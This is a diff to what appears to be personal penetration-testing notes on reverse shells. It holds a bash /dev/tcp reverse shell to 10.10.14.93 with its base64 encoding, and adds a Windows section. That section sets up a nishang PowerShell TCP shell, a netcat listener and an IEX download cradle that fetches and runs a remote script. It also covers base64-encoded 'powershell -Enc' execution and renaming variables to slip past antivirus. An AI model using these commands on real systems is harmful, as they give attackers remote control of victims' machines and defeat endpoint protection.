@@ -47,7 +47,7 @@ Download reverse shell file and imediately execute it
 
 Convert shell to base64 when sending it through http:
 
-	echo -n 'bash -i >& /dev/tcp/10.10.14.93/4444 0>&1' | base64 -w 0
+	echo -n 'bash -i >& /dev/tcp/10.10.14.93/4444 0>&1' | base64 -w0
 	YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45My80NDQ0IDA+JjE=
 
 	To get rid of the special characters like the plus sign just add double splaces:
@@ -60,6 +60,49 @@ Convert shell to base64 when sending it through http:
 
 	Try something but with 'bash -c "bash -i >& /dev/tcp/ip/port 0>&1"'
 
+## Windows Reverse shells
+
+Download nishang powershell:
+
+	git clone https://github.com/samratashok/nishang.git
+
+Copy the desired rev shell to your webserver directory:
+
+	cp nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 <webserver_path>/rev_shell.ps1
+
+Delete the comments on the rev shell and change the ip and port to your localhost ip and netcat port. When starting the netcat use the rlwrap utility so that we have access to the up and down arrows for command history:
+
+	rlwrap nc -nvlp 5555
+	https://github.com/hanslub42/rlwrap.git
+
+Now to download the rev_shell to the remote host we are gonna use a web cradle. The importance of this is that it something goes wrong and the antivirus blocks or connections, the web cradle helps determine what went wrong.
+
+	IEX(New-Object Net.WebClient).downloadString('http://<web_server_ip>:<web_servber_port>/<rev_shell_name>.ps1')
+	https://github.com/Andre92Marcos/myScripts/blob/main/web_cradle.ps1
+
+If the web cradle does not reach our web server, we know that very likely the antivirus is blocking us from downloading the rev shell. Otherwise it problably is blocking the rev shell execution itself.
+
+We change the relevant information in the web_cradle and next we are going to convert the web cradle to utf-16 little endian and then to base 64:
+
+	cat web_cradle.ps1 | iconv -t utf-16le | base64 -w0
+
+The reaseon we are converting to utf-16le is for Windows compability.
+
+And finally we powershell the base64 string in the remote host:
+
+	poweshell -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAOgA4ADAAMAAwAC8AcgBlAHYAXwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=
+
+If we get a hit on the webserver trying to download the shell, but don't get the shell on the nc we know that the web cradle is working but the antivirus is blocking the rev shell. If this happens try changing the cradle to:
+
+	IEX(IWR -UseBasicParsing http://<web_server_ip>:<web_servber_port>/<rev_shell_name>.ps1)
+
+And then change the var names in the rev shell script (already done in this shell):
+
+	https://github.com/Andre92Marcos/myScripts/blob/main/rev_shell_anti_virus.ps1
+
+
 ## Resources
 
 https://security-tips.vincd.com/reverse-shell/
+
+https://github.com/samratashok/nishang
